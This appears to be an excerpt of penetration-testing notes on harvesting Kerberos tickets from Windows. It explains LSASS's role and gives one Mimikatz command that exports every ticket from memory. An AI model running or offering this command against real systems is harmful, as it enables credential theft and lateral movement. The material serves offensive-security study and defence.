
- On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. 
- Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

## Harvesting Kerberos Tickets from Windows

### Mimikatz - Export Tickets

```powershell
.\mimikatz.exe privilege::debug "sekurlsa::tickets /export"
```
